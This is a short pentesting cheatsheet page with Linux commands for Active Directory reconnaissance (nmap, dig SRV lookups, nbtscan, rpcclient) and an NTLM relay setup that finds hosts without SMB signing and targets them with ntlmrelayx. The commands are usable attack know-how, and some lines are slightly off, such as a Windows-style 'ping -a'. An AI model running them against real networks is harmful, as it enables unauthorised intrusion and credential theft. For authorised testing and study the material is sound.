---
layout: post
title: TA0007 Discovery - AD Enumeration with Linux System
parent: Pentesting
category: Pentesting
grand_parent: Cheatsheets
modified_date: 2021-12-10
permalink: /:categories/:title/
---

<!-- vscode-markdown-toc -->
* [ENUM: DOMAIN AND IP PLAN](#ENUM:DOMAINANDIPPLAN)
* [RELAY/POISON](#RELAYPOISON)

<!-- vscode-markdown-toc-config
	numbering=false
	autoSave=true
	/vscode-markdown-toc-config -->
<!-- /vscode-markdown-toc -->

## <a name='ENUM:DOMAINANDIPPLAN'></a>ENUM: DOMAIN AND IP PLAN

```sh
# OBJECTIVE 1: Identify the DHCP server 
nmap --script broadcast-dhcp-discover
sudo tcpdump -ni eth0 udp port 67 and port 68

dig -t SRV _gc._tcp.contoso.com
dig -t SRV _ldap._tcp.contoso.com
dig -t SRV _kerberos._tcp.contoso.com
dig -t SRV _kpasswd._tcp.contoso.com

nmap --script dns-srv-enum --script-args "dns-srv-enum.domain='contoso.com'"

nbtscan -r 10.0.0.0/24

# OBJECTIVE 1: Enum domains and trusts with authenticated user - DC IP address 
rpcclient -U "johndoe" 10.1.1.1
rpcclient> enumdomains
rpcclient> enumtrusts
# Copy the output to trusts.txt

# OBJECTIVE 2: GET THE IP SUBNETTING / IP PLAN
# 2A DNS resolutions
cut -f1 -d" " trusts.txt > trusts_clean.txt                                                        │
for i in `cat trusts_clean.txt`; do ping -a $i; done                                               │

```
## <a name='RELAYPOISON'></a>RELAY/POISON

## <a name='RELAYPOISON'></a>SMBv2 SIGNING NOT REQUIRED
```sh
# STEP 1: find smb not signed
nmap -p 445 --script smb2-security-mode 10.0.0.0/24 -o output.txt

# STEP 2: set up impacket/ntlmrelayx
grep -B 9 "not required" output.txt |sed -E '/.*\((.*\..*\..*\..*)\)$/!d' |sed -E 's/.*\((.*\..*\..*\..*)\)$/\1/' > targets.txt
python3 ntlmrelayx.py -tf targets.txt -smb2support

```

## <a name='RELAYPOISON'></a>CRACKING HASHES
```sh
# Get the domain pasword policy
rpcclient -U "johndoe" 10.1.1.1
rpcclient> getdompwinfo
```